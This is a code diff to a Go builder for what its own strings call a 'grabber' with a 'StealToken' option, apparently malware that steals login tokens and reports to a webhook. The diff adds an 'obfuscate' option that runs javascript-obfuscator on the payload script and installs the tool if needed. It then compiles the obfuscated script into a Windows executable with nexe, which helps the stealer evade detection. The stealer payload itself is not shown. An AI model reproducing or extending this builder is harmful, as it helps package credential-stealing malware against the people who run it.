@@ -22,6 +22,7 @@ var (
 
 type Config struct {
 	Platform      []string `json:"platform"`
+	Obfuscate     bool     `json:"obfuscate"`
 	Logout        string   `json:"logout"`
 	InjectNotify  string   `json:"inject-notify"`
 	LogoutNotify  string   `json:"logout-notify"`
@@ -32,8 +33,9 @@ type Config struct {
 
 func init() {
 	cfg = loadConfig("config.json")
-	logger.Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Logout: %s StealToken: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
+	logger.Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Obfuscate (WARNING: experimental, always test it before using the grabber, we won't fix bugs you had if you used obfuscation :Instant feature may break often): %s Logout: %s Disable-qr-code: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
 		fmt.Sprint(cfg.Platform)+"\n",
+		fmt.Sprint(cfg.Obfuscate)+"\n",
 		cfg.Logout+"\n",
 		cfg.DisableQrCode+"\n",
 		cfg.InjectNotify+"\n",
@@ -135,6 +137,7 @@ func replace(s, old, new string) string {
 func buildPlatform() {
 	rand.Seed(time.Now().Unix())
 	for _, platform := range cfg.Platform {
+
 		switch platform {
 		case "windows":
 
@@ -172,19 +175,55 @@ func buildPlatform() {
 			if err != nil {
 				logger.Fatal("Error writing to file", err)
 			}
-			time.Sleep(time.Second)
-			versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1", "win32-x64-12.9.1"}
-			v := versions[rand.Intn(len(versions))]
-			t := fmt.Sprintf(`-t %s`, v)
-			logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
-			_, err = exec.Command("nexe", "-t", v, "-o", name, "index-win.js").Output()
-			if err != nil {
-				logger.Fatal("Error while compiling", err)
-				time.Sleep(5 * time.Second)
-				os.Exit(1)
+			if cfg.Obfuscate {
+				logger.Info("Obfuscating ...")
+				_, err := exec.Command("javascript-obfuscator", "-v").Output()
+				if err != nil {
+					logger.Fatal("Installing javascript-obfuscator", err)
+					_, err = exec.Command("npm", "install", "-g", "javascript-obfuscator").Output()
+					if err != nil {
+						logger.Fatal(`Error while installing javascript-obfuscator, "npm install -g javascript-obfuscator", run this command in cmd please. Will exit in 5 seconds`, err)
+						time.Sleep(5 * time.Second)
+						os.Exit(1)
+					}
+				}
+				out, err := exec.Command("javascript-obfuscator", "index-win.js", "--config", "obf-config.json", "--output", "output.js").Output()
+				if err != nil {
+					logger.Fatal("Error with Obfuscator", err)
+				}
+				logger.Info(fmt.Sprintf(`Out Obf Command: %s`, out))
+				time.Sleep(time.Second)
+				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
+				v := versions[rand.Intn(len(versions))]
+				t := fmt.Sprintf(`-t %s`, v)
+				logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s output.js`, t, name))
+				_, err = exec.Command("nexe", "-t", v, "-o", name, "output.js").Output()
+				if err != nil {
+					logger.Fatal("Error while compiling", err)
+					time.Sleep(5 * time.Second)
+					os.Exit(1)
+				}
+
+				err = os.RemoveAll("output.js")
+				if err != nil {
+					logger.Info("Error while removing file", err)
+				}
+
+			} else {
+				time.Sleep(time.Second)
+				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
+				v := versions[rand.Intn(len(versions))]
+				t := fmt.Sprintf(`-t %s`, v)
+				logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
+				_, err = exec.Command("nexe", "-t", v, "-o", name, "index-win.js").Output()
+				if err != nil {
+					logger.Fatal("Error while compiling", err)
+					time.Sleep(5 * time.Second)
+					os.Exit(1)
+				}
 			}
 			logger.Info("Windows Executable has been built with your webhook")
-			time.Sleep(time.Second * 10)
+			time.Sleep(time.Second * 5)
 
 		}
 	}
